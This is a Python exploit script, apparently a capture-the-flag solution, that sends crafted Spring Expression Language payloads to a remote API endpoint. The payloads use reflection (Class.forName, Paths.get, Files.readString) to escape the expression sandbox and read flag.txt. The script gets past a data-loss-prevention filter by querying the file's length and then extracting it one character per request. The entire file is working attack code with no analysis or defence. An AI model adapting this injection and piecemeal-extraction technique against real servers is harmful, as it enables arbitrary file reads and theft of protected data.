import requests


BASE = "http://39.105.213.28:12603/api/route"

# Class.forName(String)
FOR_NAME = "''.class.class.methods[2]"
# Paths.get(String)
PATHS_GET = "#cf('java.nio.file.Paths').methods[0]"
# Files.readString(Path)
FILES_READ_STRING = "#cf('java.nio.file.Files').declaredMethods[61]"


def eval_expr(expr: str) -> str:
    r = requests.get(BASE, params={"expr": expr}, timeout=20)
    r.raise_for_status()
    return r.text


def build_flag_string_expr() -> str:
    # Build one SpEL expression that returns the full contents of flag.txt.
    return (
        "{"
        f"#cf={FOR_NAME},"
        f"#pm={PATHS_GET},"
        "#path=#pm('flag.txt'),"
        f"#m={FILES_READ_STRING},"
        "#m(#path)"
        "}[4]"
    )


def main() -> None:
    flag_expr = build_flag_string_expr()

    # Direct output is blocked by the target DLP, so first query the length,
    # then read one character at a time with string indexing.
    length = int(eval_expr(flag_expr + ".bytes.length").strip())
    chars = []
    for i in range(length):
        ch = eval_expr(f"{flag_expr}[{i}]")
        if ch == "\n":
            break
        chars.append(ch)

    print("".join(chars))


if __name__ == "__main__":
    main()
